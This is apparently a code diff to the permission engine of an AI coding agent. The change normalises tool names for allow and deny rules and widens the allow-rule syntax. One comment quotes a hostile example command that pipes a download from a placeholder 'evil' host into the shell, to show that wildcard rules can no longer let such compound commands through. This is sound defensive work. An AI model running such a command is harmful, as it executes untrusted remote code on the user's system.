@@ -7,6 +7,7 @@ import type { Logger } from "../obs/logger";
 import { type Decomposed, decomposeBash, refusesAutoApproval } from "./shell-decompose";
 // Type-only: no runtime cycle even though safety-envelope imports globMatch from here.
 import type { SafetyDisposition, SafetyReason } from "./safety-envelope";
+import { canonicalToolName } from "../tools/tool-name";
 
 /**
  * Permission engine: a deny → allow → mode-default cascade. Pure data + string
@@ -195,11 +196,11 @@ export function defaultForMode(mode: PermissionMode, req: PermissionRequest): De
  *  but NOT `git status && curl evil | sh` — a trailing `*` can no longer launder a compound
  *  command past the gate (the whole-command match `^git.*$` used to cover the entire chain). */
 function ruleMatches(rule: string, req: PermissionRequest): boolean {
-  const m = rule.match(/^([A-Za-z_]+)(?:\((.*)\))?$/);
+  const m = rule.match(ALLOW_RULE);
   if (!m) return false;
   const tool = m[1]!;
   const pattern = m[2];
-  if (tool !== req.toolName) return false;
+  if (canonicalToolName(tool) !== canonicalToolName(req.toolName)) return false;
   if (pattern === undefined) return true;
   if (req.toolName === "Bash") {
     // Every simple command it runs must match (one of its forms); a line that cannot be decomposed, changes the
@@ -225,18 +226,30 @@ function prefixPattern(pattern: string): boolean {
 
 /** An allow rule with an argument pattern that can never admit a call: a host says so rather than leave it inert. */
 export function unjudgeableAllow(rule: string): boolean {
-  const m = rule.match(/^([A-Za-z_]+)\((.*)\)$/);
-  return m !== null && m[1] !== "Bash" && !FILE_TOOLS.has(m[1]!) && !prefixPattern(m[2]!);
+  const m = rule.match(ALLOW_RULE);
+  return m !== null && m[2] !== undefined && m[1] !== "Bash" && !FILE_TOOLS.has(m[1]!) && !prefixPattern(m[2]);
 }
 
 /** The tool part of a deny rule or an approval entry (P7 1.7): an exact name, or a glob whose only wildcard is `*`,
- *  case-sensitive (`Deploy*` names `DeployProd`; `mcp__github__*` every tool of that server). */
-function toolMatches(tool: string, name: string): boolean {
-  return tool.includes("*") ? globMatch(tool, name) : tool === name;
+ *  case-sensitive (`Deploy*` names `DeployProd`; `mcp__github__*` every tool of that server). An MCP server part is
+ *  compared canonically (`cascade-planner-tools` and `cascade_planner_tools` are one server: tools/tool-name.ts). */
+export function toolMatches(tool: string, name: string): boolean {
+  const t = canonicalToolName(tool);
+  const n = canonicalToolName(name);
+  return t.includes("*") ? globMatch(t, n) : t === n;
 }
 
 /** A deny rule or an approval entry: its tool part (P7's characters and `*`) and an optional argument pattern. */
 const DENY_RULE = /^([A-Za-z0-9_*:.-]+)(?:\((.*)\))?$/;
+/** An allow rule: an exact tool name (no wildcard: an allow names what it admits) and an optional argument pattern.
+ *  Digits and `-` are tool-name characters (an MCP server is often named `my-tools`): before #72 an allow naming such
+ *  a tool did not parse and was silently inert. */
+const ALLOW_RULE = /^([A-Za-z0-9_:.-]+)(?:\((.*)\))?$/;
+
+/** The tool part a permission rule names, or null when the rule does not parse (it can then never match a call). */
+export function ruleTool(rule: string, kind: "allow" | "deny"): string | null {
+  return rule.match(kind === "allow" ? ALLOW_RULE : DENY_RULE)?.[1] ?? null;
+}
 
 /**
  * Whether a deny rule (or a publication's approval entry, matched the same way) names this call, and what it matched:
